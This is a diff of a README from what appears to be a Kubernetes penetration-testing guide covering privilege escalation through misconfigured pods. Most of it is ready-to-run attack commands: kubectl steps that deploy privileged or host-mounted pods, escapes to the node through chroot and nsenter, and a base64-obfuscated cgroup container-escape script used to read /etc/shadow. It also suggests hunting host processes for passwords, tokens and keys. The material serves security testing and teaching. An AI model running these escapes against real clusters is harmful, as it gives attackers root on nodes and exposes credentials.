@@ -39,18 +39,26 @@ If there are no pod admission controllers applied,or a really lax policy, you ca
 
 [pod-chroot-node.yaml](yaml/pod-chroot-node.yaml)
 
+### Create a pod
 ```bash
 # Option 1: Create pod from local yaml 
 kubectl apply -f pod-chroot-node.yaml [-n namespace] 
 # Option 2: Create pod from github hosted yaml
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-chroot-node.yaml [-n namespace] 
-
-# Exec into pod 
-kubectl -n [namespace] exec -it pod-chroot-node -- chroot /host
-# Do stuff in pod
-# You now have full root access to the node
 ```
 
+### Exec into pod 
+```bash
+kubectl -n [namespace] exec -it pod-chroot-node -- chroot /host
+
+```
+
+### Post exploitation
+```bash
+# You now have full root access to the node
+# TODO: Next steps
+```
+   
 Reference(s): 
 * https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
 
@@ -62,17 +70,25 @@ If you have `privileged=true` and `hostPID` available to you, you can use the `n
 
 [pod-priv-and-hostpid.yaml](yaml/pod-priv-and-hostpid.yaml)
 
+### Create a pod
 ```bash
 # Option 1: Create pod from local yaml 
 kubectl apply -f pod-priv-and-hostpid.yaml [-n namespace] 
 # Option 2: Create pod from github hosted yaml
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-priv-and-hostpid.yaml [-n namespace] 
+```
 
-# Exec into pod 
+### Exec into pod 
+```bash
 kubectl -n [namespace] exec -it bf-nsenter -- bash
+```
+
+### Post exploitation
+```bash
 # Use nsenter to gain full root access on the node
 nsenter --target 1 --mount --uts --ipc --net --pid -- bash
-
+# You now have full root access to the node
+# TODO: Next steps
 ```
 
 Reference(s): 
@@ -83,17 +99,22 @@ Reference(s):
 
 If you only have `privileged=true`, you can still get RCE on the host, and ultimately cluster-admin, but the path is more tedious. The exploit below escapes the container and allows you to run one command at a time. From there, you can launch a reverse shell.  
 
-
-
+### Create a pod
 ```bash
 # Option 1: Create pod from local yaml 
 kubectl apply -f pod-priv-only.yaml  [-n namespace] 
 # Option 2: Create pod from github hosted yaml
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-priv-only.yaml [-n namespace] 
+```
 
-# Exec into pod 
+### Exec into pod 
+```bash
 kubectl -n [namespace] exec -it bf-privpod -- bash
-#create undock script that will automate the container escape POC
+```
+
+### Post exploitation
+```bash
+# Create undock script that will automate the container escape POC
 echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICRkL3c7ZWNobyAxID4kZC93L25vdGlmeV9vbl9yZWxlYXNlCnQ9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAp0b3VjaCAvbzsgZWNobyAkdC9jID4kZC9yZWxlYXNlX2FnZW50O2VjaG8gIiMhL2Jpbi9zaAokMSA+JHQvbyIgPi9jO2NobW9kICt4IC9jO3NoIC1jICJlY2hvIDAgPiRkL3cvY2dyb3VwLnByb2NzIjtzbGVlcCAxO2NhdCAvbwo= | base64 -d > undock.sh 
 # Then use the script to run whatever commands you want on the host: 
 sh undock.sh "cat /etc/shadow"
@@ -110,18 +131,23 @@ If you only have `hostPID=true`, you most likely won't get RCE on the host, but 
 
 [pod-hostpid-only.yaml](yaml/pod-hostpid-only.yaml)
 
+### Create a pod
 ```bash
 # Option 1: Create pod from local yaml 
 kubectl apply -f pod-hostpid-only.yaml  [-n namespace] 
 # Option 2: Create pod from github hosted yaml
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostpid-only.yaml [-n namespace] 
+```
 
-# Exec into pod 
+### Exec into pod 
+```bash 
 kubectl -n [namespace] exec -it bf-hostpid -- bash
+```
+### Post exploitation
+```bash
 # View all processes running on the host and look for passwords, tokens, keys, etc.
 ps -aux
-#You can also kill any process, but don't do that in production :)
-
+# You can also kill any process, but don't do that in production :)
 ```
 
 ## hostNetwork pod - You can create a pod with only hostNetwork
@@ -179,10 +205,9 @@ kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/p
 kubectl -n [namespace] exec -it bf-hostipc -- bash
 ```
 
-### Post Exploitation 
+### Post exploitation 
 ```bash
-Look for any use of inter-process communication on the host 
-```bash
+# Look for any use of inter-process communication on the host 
 ipcs -a
 ```
 
